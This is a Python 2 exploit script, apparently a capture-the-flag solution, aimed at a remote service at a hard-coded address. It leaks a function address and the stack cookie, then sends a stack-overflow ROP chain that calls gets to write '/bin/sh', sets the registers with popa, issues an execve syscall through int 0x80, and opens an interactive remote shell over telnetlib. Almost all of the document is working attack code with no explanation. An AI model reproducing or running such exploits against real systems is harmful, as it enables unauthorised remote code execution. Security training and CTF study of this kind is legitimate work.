#!/usr/bin/python
import struct
import socket
import telnetlib

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

def make_conn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('146.148.79.13', 55173))
    f = s.makefile('rw', bufsize=0)
    return s, f

def leak(addr):
    s, f = make_conn()
    f.write(str(addr) + '\0\n')
    return f.read()

data = 0x00403000
gets_import = 0x0040209C
gets = u(leak(gets_import)[:4])
main = 0x401000
write = 0x401844

print 'gets =', hex(gets)

kernel32_base = 0x7b800000
security_cookie = 0x00403000

# brute forced with a write ROP
ebp = 0x32f538

payload = str(security_cookie)
payload = payload.ljust(0x50, '\x00')
payload += p(main)
payload += 'A' * 80

s, f = make_conn()

assert '\n' not in payload
f.write(payload + '\n')
cookie = u(f.read(4096)[:4])
print 'cookie =', hex(cookie)

pop_ebp_ret = 0x401052
int80 = kernel32_base + 0x3f9a3
popa_ret = kernel32_base + 0x23d21

assert leak(int80).startswith('\xcd\x80')
assert leak(popa_ret).startswith('\x61\xc3')

payload = str(security_cookie)
payload = payload.ljust(16, '\x00')
payload += p(ebp ^ cookie)
payload += 'A' * 8
payload += p(gets)
payload += p(pop_ebp_ret)
payload += p(data)
payload += p(popa_ret)
payload += p(0) # edi
payload += p(0) # esi
payload += p(0) # ebp
payload += p(0) # esp (skipped)
payload += p(data) # ebx
payload += p(0) # edx
payload += p(0) # ecx
payload += p(0xb) # eax
payload += p(int80)

print 'stage 2'
assert '\n' not in payload
f.write(payload + '\n')
f.read(4096)
f.write('/bin/sh\0\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()

